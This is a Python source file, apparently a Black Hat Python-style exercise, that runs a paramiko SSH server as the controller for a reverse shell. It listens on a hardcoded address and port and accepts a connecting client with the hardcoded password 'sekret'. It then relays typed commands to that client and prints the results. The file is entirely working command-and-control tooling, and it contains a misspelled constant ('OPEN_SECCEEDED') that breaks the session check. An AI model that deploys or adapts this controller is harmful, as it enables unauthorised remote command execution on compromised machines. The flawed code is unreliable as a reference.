import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server (paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SECCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if(username == 'zak' and password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL


if __name__ == '__main__':
    server = '192.168.1.207'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+] Listening for connection ...")
        client, addr = sock.accept()
    except Exception as e:
        print("[-] Listening failed: " + str(e))
        sys.exit(1)
    else:
        print("[+] Got a connection", client, addr)

    bhpSession = paramiko.Transport(client)
    bhpSession.add_server_key(HOSTKEY)
    server = Server()
    bhpSession.start_server(server=server)

    chan = bhpSession.accept(20)
    if chan is None:
        print('*** No channel. ')
        sys.exit(1)

    print("[+] Authentication successful")
    print(chan.recv(1024))
    chan.send("welcome to BH_SSH")
    try:
        while True:
            command = input("Enter a command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('Exiting...')
                bhpSession.close()
                break
    except KeyboardInterrupt:
        bhpSession.close()